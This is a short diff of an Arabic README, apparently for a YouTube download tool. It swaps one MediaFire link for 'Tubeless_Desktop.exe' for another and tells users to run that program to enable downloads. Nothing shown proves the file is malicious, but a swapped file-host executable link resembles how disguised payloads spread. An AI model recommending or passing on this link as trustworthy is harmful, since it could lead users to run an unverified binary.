@@ -58,7 +58,7 @@
 ## الوسائط والتحميل
 
 > [!IMPORTANT]
-> لتمكين التحميل، تأكد من تشغيل تطبيق <a href="https://www.mediafire.com/file/0guc81ip46xikzp/Tubeless_Desktop.exe/file" target="_blank">Tubeless Desktop</a> على جهاز الكمبيوتر الخاص بك.
+> لتمكين التحميل، تأكد من تشغيل تطبيق <a href="https://www.mediafire.com/file/1aiwbv7mkrukpio/Tubeless_Desktop.exe/file" target="_blank">Tubeless Desktop</a> على جهاز الكمبيوتر الخاص بك.
 
 ### كيفية التحميل
 1.  افتح أي فيديو يوتيوب.
